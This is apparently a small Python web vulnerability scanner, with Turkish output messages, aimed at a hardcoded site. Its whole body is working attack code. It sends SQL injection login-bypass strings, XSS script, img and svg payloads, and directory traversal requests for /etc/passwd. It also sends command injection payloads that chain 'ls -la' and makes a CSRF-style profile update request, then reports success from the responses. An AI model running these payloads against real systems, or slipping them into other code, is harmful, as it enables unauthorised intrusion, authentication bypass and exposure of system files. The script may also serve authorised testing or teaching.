import requests
from bs4 import BeautifulSoup


intro = """
************************************
*                                  *
*            emre0x02              *
*                                  *
************************************
"""

print(intro)


url = "http://emre0x02.com"

sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 'a'='a",
    "' OR 'a'='a' -- "
]

xss_payloads = [
    "<script>alert('XSS');</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<svg/onload=alert('XSS')>"
]

def test_directory_traversal(payload):
    response = requests.get(url, params={'file': payload})
    if "root:" in response.text or "bin:" in response.text:
        print(f"Directory Traversal Başarılı: {payload}")
    else:
        print(f"Başarısız: {payload}")

def test_command_injection(payload):
    response = requests.get(url, params={'command': payload})
    if "bin" in response.text or "root" in response.text:
        print(f"Command Injection Başarılı: {payload}")
    else:
        print(f"Başarısız: {payload}")

def get_csrf_token():
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_element = soup.find('input', {'name': 'csrf_token'})
    if token_element:
        return token_element['value']
    return None

def test_csrf():
    csrf_token = get_csrf_token()
    if csrf_token:
        data = {
            'csrf_token': csrf_token,
            'username': 'newuser',
            'email': 'newuser@example.com'
        }
        response = requests.post(url, data=data)
        if "Profile updated" in response.text:
            print("CSRF test başarılı")
        else:
            print("CSRF test başarısız")
    else:
        print("CSRF token bulunamadı")

def test_sql_injection(payload):
    data = {
        'username': payload,
        'password': 'password'
    }
    response = requests.post(url, data=data)
    if "Giriş başarılı" in response.text or "error" in response.text:
        print(f"SQL Enjeksiyonu Başarılı: {payload}")
    else:
        print(f"Başarısız: {payload}")

def test_xss(payload):
    data = {
        'input': payload
    }
    response = requests.post(url, data=data)
    if payload in response.text:
        print(f"XSS Başarılı: {payload}")
    else:
        print(f"Başarısız: {payload}")

print("SQL Enjeksiyonu Testi:")
for payload in sql_payloads:
    test_sql_injection(payload)

print("\nXSS Testi:")
for payload in xss_payloads:
    test_xss(payload)

print("\nCSRF Testi:")
test_csrf()

print("\nDirectory Traversal Testi:")
dir_traversal_payloads = [
    "../etc/passwd",
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd"
]
for payload in dir_traversal_payloads:
    test_directory_traversal(payload)

print("\nCommand Injection Testi:")
command_injection_payloads = [
    "; ls -la",
    "| ls -la",
    "`ls -la`"
]
for payload in command_injection_payloads:
    test_command_injection(payload)
